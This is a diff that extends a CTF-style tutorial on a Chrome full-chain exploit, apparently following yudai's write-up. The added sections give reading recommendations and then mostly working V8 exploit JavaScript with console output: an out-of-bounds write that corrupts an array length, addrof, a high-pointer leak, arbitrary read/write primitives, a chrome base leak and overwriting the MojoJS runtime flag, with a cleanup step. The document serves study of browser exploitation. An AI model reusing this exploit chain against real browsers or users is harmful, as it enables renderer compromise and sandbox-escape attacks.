@@ -46,6 +46,14 @@ $ md5sum fullchain-zip
 
 ## Prerequisite Reading
 
+The first thing I attempted was a passthrough of yudai's full-chain writeup. Going through it for the first time, I realized there was some prerequisite knowledge that I needed. I bounced around a variety of online references in a jumbled order the first time and so for future readers, below is my recommended order of reading.
+
+1. [Google Chrome Comic](https://www.google.com/googlebooks/chrome/big_00.html) - It might seem kind of silly, but truthfully I had gone through various text resources before coming across this comic that ended up being very digestable and helpful for describing the software architectural design decisions of chrome.
+2. [Pointer compression v8 blog](https://v8.dev/blog/pointer-compression) - The next thing I realized I needed to learn was small-integer representation and pointer compression. This concept is crucial for understanding some of the exploit steps in the browser exploit.
+3. [Sensepost - Intro to chrome v8 exploit dev](https://sensepost.com/blog/2020/intro-to-chromes-v8-from-an-exploit-development-angle/) - This article provided a much needed short overview on the main components of v8.
+
+Below are links to other stuff I read but didn't necessarily end up needing to follow the full-chain writeup.
+
 
 
 ## Summary of exploit
@@ -221,7 +229,7 @@ On Linux, you may need to disable ptrace yama scope before attaching to the proc
 
 In our example of javascript code executed within the infinite loop `x.set(y, 33);`, we will probably break on the native function `Builtins_TypedArrayPrototypeSet`.
 
-Looking at the source code for this function, there is a call to `memmove` that we can break on to verify the source and destination pointers as well as the value being copied.
+Looking at the source code for this function, there is a call to `memmove` that we can break on to verify the source and destination pointers as well as the value being copied. We could also leave magic values in memory and search for them in the debugger.
 
 ```
 (gdb) b * libc_memmove
@@ -238,14 +246,211 @@ From the output above, we can see that 4 bytes are copied from rsi to rdi and th
 
 This confirms that we overwrote the length field of array z as mentioned above to achieve our addrof primitive!
 
+**addrof continued**
+
+We can prepare the target object to be leaked after the array whose length field we have overwritten and read the target object's pointer using the out-of-bounds read.
+
+Let's go through the exercise of getting a simplistic view of what the memory might look like that makes the `addrof` primitive work.
+
+```javascript
+function make_primitives() {
+    let y = new Uint32Array(1);
+    // y = [ y0 ]
+
+    let x = new Uint32Array(1);
+    // x = [ x0 ]
+
+    let z = [1.1, 1.1, 1.1, 1.1];
+    // z = [ 1.1 | 1.1 | 1.1 | 1.1 ]
+
+    let arr_addrof = [{}];
+    // arr_addrof = [ ]
+
+    y.set([0x8888], 0);
+    // y = [ 0x8888 ]
+
+    // use out-of-bounds write to achieve out-of-bounds read
+    x.set(y, 33);
+    // offset 33 out-of-bounds -v
+    // x = [ x0 ] ... ... ... [ 0x8888 ] ... [ 1.1 | 1.1 | 1.1 | 1.1 ]
+    // array z's length metadata -^ 
+    // overwrite with a big length value
+
+    console.log("[+] z.length = " + z.length);
+    return [z, arr_addrof];
+}
+function addrof(obj) {
+    arr_addrof[0] = obj;
+    // arr_addrof = [ obj ]
+
+    // out-of-bounds read from array z to get the object's pointer
+    // z = [ 1.1 | 1.1 | 1.1 | 1.1 ] ... [ obj ]
+    // f2i() is a utility function
+    return (z[7].f2i() >> 32n) - 1n;
+}
+let [z, arr_addrof] = make_primitives();
+let target = {};
+
+// %DebugPrint(target); // this only works when running the javascript code in d8
+// in chrome, you'll get a [1106/090532.695247:INFO:CONSOLE(17)] "Uncaught SyntaxError: Unexpected token '%'"
+
+// see that the addrof worked!
+console.log(addrof(target).hex());
+```
+
+If you run the above code in chrome, you'll get the following error:
+```
+[1106/091402.945680:INFO:CONSOLE(13)] "Uncaught TypeError: z[7].f2i is not a function", source: file:///home/user/Public/chromium/v8_exploit.js (13)
+```
+
+This is because we are missing some utility functions. Prepend the following utility functions into the javascript code to perform the necessary conversions from float -> int and int -> float.
+```javascript
+let conversion_buffer = new ArrayBuffer(8);
+let float_view = new Float64Array(conversion_buffer);
+let int_view = new BigUint64Array(conversion_buffer);
+BigInt.prototype.hex = function() {
+    return '0x' + this.toString(16);
+};
+BigInt.prototype.i2f = function() {
+    int_view[0] = this;
+    return float_view[0];
+}
+Number.prototype.f2i = function() {
+    float_view[0] = this;
+    return int_view[0];
+}
+```
+
+We'll load up this javascript code and run it in chrome, and find that the address is 32-bit. 
+
+The output looks like:
+```
+[1106/091114.688124:INFO:CONSOLE(22)] "[+] z.length = 17476", source: file:///home/user/Public/chromium/v8_exploit.js (22)
+[1106/091114.691562:INFO:CONSOLE(31)] "0x8242320", source: file:///home/user/Public/chromium/v8_exploit.js (31)
+```
+
+But I thought chrome is a 64-bit process now? Internally, pointers are made 32-bit because of pointer compression.
+
+So the leak is not yet complete, we also need to leak the high-pointer to get a full 64-bit address.
+
+**leaking the high pointer**
+
+The TypedArray object is special and contains a full address because its buffer size can be large and so it is allocated in a different heap region.
+
+// TODO: Verify the above statement in the source code
+
+In our `make_primitives()` function, we can add a `Float64Array()` after the array we use for the `addrof()` primitive and use our out-of-bounds read access to read the pointer to this buffer.
+
+This might look like:
+```javascript
+function make_primitives() {
+    let y = new Uint32Array(1);
+    ...
+    let arr_addrof = [{}];
+    // all of our previous code in this function above
+
+    let f_arr = new Float64Array(1);
+    // create the typed array
+    ...
+```
+
+We use offset `28` in array z to obtain the pointer to the full address.
+```javascript
+let heap_upper = z[28].f2i() & 0xffffffff00000000n;
+console.log("[+] heap_upper = " + heap_upper.hex());
+```
+
 **arbitrary address primitives**
 
 Our current exploit primitives are:
 * out-of-bounds write
 * out-of-bounds read 
 * addrof
+* high pointer leak
 
 The next building block is to achieve an arbitrary-address-read (AAR) and arbitrary-address-write (AAW). The AAR and AAW exploit primitives will provide the ability for us to read and write values from a pointer we specify.
+
+We recently leaked the full address of the buffer for a TypedArray object. We can reuse this full address access and overwrite the pointer to achieve arbitrary-address-write and arbitrary-address-read.
+
+**arbitrary-address-read**
+```javascript
+function aar64(addr) {
+    // overwrite 32-bits of the pointer
+    z[28] = ((addr & 0xffffffff00000000n) | 7n).i2f();
+    // overwrite the next 32-bits of the pointer
+    z[29] = (((addr - 8n) | 1n) & 0xffffffffn).i2f();
+    // arbitrary address read
+    return f_arr[0].f2i();
+}
+```
+
+**arbitrary-address-write**
+```javascript
+function aaw64(addr, value) {
+    // overwrite 32-bits of the pointer
+    z[28] = ((addr & 0xffffffff00000000n) | 7n).i2f();
+    // overwrite the other 32-bits
+    z[29] = (((addr - 8n) | 1n) & 0xffffffffn).i2f();
+    // arbitrary address write
+    f_arr[0] = value.i2f();
+}
+```
+
+We can view chrome's runtime flags [here](https://source.chromium.org/chromium/chromium/src/+/main:out/Debug/gen/third_party/blink/renderer/platform/runtime_enabled_features.h;l=423?q=is_mojo_js_enabled_&ss=chromium)
+
+This boolean variable will be located in the chrome binary's memory. Our goal then is to leak an address from the chrome binary to obtain the base address.
+
+yudai uses the `HTMLDivElement` object which is represented by the javascript code `let div = document.createElement('div');`.
+
+First, the `heap_upper` high pointer leak and the `addrof` primitive is used to obtain the address of the `div` object.
+
+Then this address is passed to the arbitrary-address-read primitive to read a chrome memory address.
+
+We subtract the offset of the memory address to compute the chrome base address.
+
+We can find this offset using a debugger or our disassembler of choice.
+
+The corresponding javascript code is below:
+```javascript
+/* Leak chrome base */
+let div = document.createElement('div');
+let addr_div = heap_upper | addrof(div);
+console.log("[+] addr_div = " + addr_div.hex());
+let addr_HTMLDivElement = aar64(addr_div + 0xCn);
+console.log("[+] <HTMLDivElement> = " + addr_HTMLDivElement.hex());
+let chrome_base = addr_HTMLDivElement - 0xc1bb7c0n;
+console.log("[+] chrome_base = " + chrome_base.hex());
+```
+
+Similarly, we can find the offset for `is_mojo_js_enabled` by using a debugger or our disassembler of choice. We add the offset to our chrome base and use the arbitrary-address-write primitive to flip the bits in the flag.
+
+The corresponding javascript code is below:
+```javascript
+/* Enable MojoJS */
+console.log("[+] Overwriting flags..");
+let addr_flag_MojoJS = chrome_base + 0xc560f0en;
+aaw64(addr_flag_MojoJS & 0xfffffffffffffff8n, 0x0101010101010101n);
+```
+
+**browser exploit cleanup**
+
+After enabling mojo, the web-page must be reloaded which will free the javascript objects, some of which have pointers that have been corrupted. The garbage collector will crash unless we perform a cleanup step.
+
+We can save the original pointer for the TypedArray we use in the arbitrary-address-read-write primitive and restore it at the end of the javascript code before reloading the web-page to the next stage.
+
+```javascript
+    let original_28 = z[28];
+    let original_29 = z[29];
+...
+    function cleanup() {
+        z[28] = original_28;
+        z[29] = original_29;
+    }
+...
+    /* Cleanup */
+    cleanup();
+    window.location.href = "/sbx_exploit.html";
+```
 
 **Sandbox escape**
 
